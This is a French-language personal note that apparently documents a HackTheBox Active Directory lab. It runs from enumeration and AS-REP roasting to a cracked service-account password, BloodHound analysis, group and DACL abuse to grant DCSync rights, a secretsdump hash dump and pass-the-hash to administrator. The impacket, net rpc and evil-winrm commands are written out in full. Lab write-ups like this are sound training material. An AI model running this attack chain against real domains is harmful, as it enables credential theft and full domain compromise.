---
date: 2026-04-22
tags:
  - htb
  - easy
  - AD
  - kerberoast
  - bloodhound
  - dacl
  - secretdump
  - dcsync
---


# Recon


TCP scan : 

![[Pasted image 20260422103311.png]]

![[Pasted image 20260422103347.png]]


Je prends note des éléments importants.


enum4linux : je retrouve beaucoup de choses comme une liste d'usagers.

![[Pasted image 20260422103559.png]]


Je filtre la liste avec `awk` pour extraire seulement les noms d'usagers que je vais mettre dans une liste.

![[Pasted image 20260422104139.png]]

# Exploit



## port 135 rpc


Rien. On a besoin de credentials.

![[Pasted image 20260422104532.png]]


## port 139 / 445 smb


Rien non plus.

![[Pasted image 20260422104605.png]]




## port 389 LDAP


Je suis capable d'interroger le port ldap.

![[Pasted image 20260422105408.png]]


Il y a beaucoup d'informations et je n'ai pas pu trouver quoi que ce soit.

## as-rep roast

Je lance la commande et je trouve le hash d'un usager : `impacket-GetNPUsers htb.local/ -dc-ip 10.129.24.99 -no-pass -usersfile users.txt`

![[Pasted image 20260422114425.png]]


Et je suis capable de le briser avec hashcat.

![[Pasted image 20260422114544.png]]


Donc le mot de passe pour svc-alfresco est s3rvice, que je prends note et que j'ajoute dans ma liste de mots de passe.


## svc-alfresco

Je me connecte sur le compte trouvé avec evil-winrm et je trouve le flag.

![[Pasted image 20260422114935.png]]



# PrivEsc


## Bloodhound 

Je ne trouve pas grand chose donc je vais utiliser bloodhound. Je commence par collecter des informations avec cette commande pour ensuite les ingérer dans bloodhound. `bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -c All -ns 10.129.24.99``

![[Pasted image 20260422115526.png]]



Sur bloodhound, on retrouve que notre usager a GenericAll sur le groupe `Exchange Windows Permissions` et, ensuite, on a WriteDACL sur le domaine pour avoir accès à administrator.

![[Pasted image 20260422120258.png]]


## GenericAll sur Exchange Windows Permissions


Je l'ajoute comme suit : `net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.99"``

![[Pasted image 20260422120656.png]]


Il n'y a pas de sortie pour savoir si la commande a fonctionné. Je me reconnecte avec evil-winrm sur svc-alfresco et je trouve que mon usager fait maintenant partie du groupe voulu.



## WriteDacl sur le domaine


### Grant dc privilege

J'ai trouvé une erreur, mon ajout d'usager est incorrect, ça ne fonctionne pas.

![[Pasted image 20260422132447.png]]


L'erreur que j'ai faite est qu'il ne faut pas spécifier le nom du groupe entièrement en majuscules. Mon usager n'était pas dans le bon groupe.

![[Pasted image 20260422133650.png]]

`net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.99"'

verification du groupe : `net rpc group members "Exchange Windows Permissions"  -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.111"` .  Je trouve que mon usager est reellement dans le gorupe.

![[Pasted image 20260422133735.png]]



Par contre, si je ne suis pas rapide, mon usager est supprimé du groupe.

![[Pasted image 20260422134638.png]]

Je vais donc chaîner les commandes ensemble.

Pour avoir le privilège de DCSync, je vais rouler cette commande : `impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'`


Donc je chaîne les commandes d'ajout de groupe et d'ajout de la permission DCSync donnant :
```
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.111";net rpc group members "Exchange Windows Permissions"  -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.111";impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
```


![[Pasted image 20260422135016.png]]


## DCSync

Je peux entamer le DCSync avec secretsdump :
`impacket-secretsdump svc-alfresco:s3rvice@10.129.24.111`

![[Pasted image 20260422135142.png]]


Je fais du pass-the-hash pour me connecter en tant qu'administrator et j'obtiens le flag.

![[Pasted image 20260422135313.png]]


